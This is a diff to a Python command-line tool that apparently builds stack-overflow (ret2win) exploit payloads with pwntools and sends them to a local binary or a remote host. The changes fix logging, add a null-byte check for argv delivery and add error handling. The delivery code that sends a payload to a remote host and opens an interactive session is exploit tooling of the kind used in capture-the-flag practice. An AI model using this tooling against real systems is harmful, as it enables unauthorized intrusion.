@@ -92,7 +92,11 @@ def main():
         return
 
     # In CLI mode, allow pwntools info-level messages through
-    context.log_level = 'warn'
+    # (NOTE: 'warn' actually suppresses log.info() output entirely in
+    # pwntools' logging hierarchy, which silently hid all of the
+    # Binary/offset/validation status messages below -- 'info' is the
+    # correct level for "info and above" to be shown).
+    context.log_level = 'info'
 
     # In CLI mode, ensure required arguments are present
     if not args.binary or not args.win_addr:
@@ -189,21 +193,43 @@ def main():
 
     log.success(f"Payload written to {args.output} ({len(payload)} bytes)")
     console.print(table)
-    console.print(core.format_colorized_hexdump(payload, offset, has_align=args.align, bits=bits))
+    console.print(core.format_colorized_hexdump(payload, offset, has_align=args.align, bits=bits, ret_gadget=ret_gadget))
 
     if args.run or args.remote:
-        if args.remote:
-            host, port = args.remote
-            conn = remote(host, int(port))
-            conn.sendline(payload)
-            conn.interactive()
-        else:
-            if args.input_mode == "argv":
-                conn = process([args.binary, payload])
-            else:
-                conn = process(args.binary)
+        # argv[] entries are NUL-terminated C strings, so a payload that embeds
+        # a null byte anywhere before its final byte can never be delivered
+        # whole via argv -- this is a kernel/execve limitation, not something
+        # this tool can route around. Most 64-bit addresses pack with trailing
+        # 0x00 bytes, so this is the common case rather than an edge case.
+        # Without this check it previously crashed with a raw, unhandled
+        # pwntools traceback instead of a clear explanation.
+        if args.input_mode == "argv" and not args.remote and b"\x00" in payload[:-1]:
+            print(
+                "[!] This payload contains a null byte before its final byte, "
+                "so it cannot be passed whole as an argv[] argument (argv "
+                "strings are NUL-terminated). This is a fundamental limitation "
+                "of argv-based delivery, not specific to this tool -- switch "
+                "to --input-mode stdin if the vulnerable program supports it, "
+                "or choose a win address / gadget without embedded null bytes."
+            )
+            sys.exit(1)
+
+        try:
+            if args.remote:
+                host, port = args.remote
+                conn = remote(host, int(port))
                 conn.sendline(payload)
-            conn.interactive()
+                conn.interactive()
+            else:
+                if args.input_mode == "argv":
+                    conn = process([args.binary, payload])
+                else:
+                    conn = process(args.binary)
+                    conn.sendline(payload)
+                conn.interactive()
+        except Exception as e:
+            print(f"[!] Execution error: {e}")
+            sys.exit(1)
 
 
 if __name__ == "__main__":
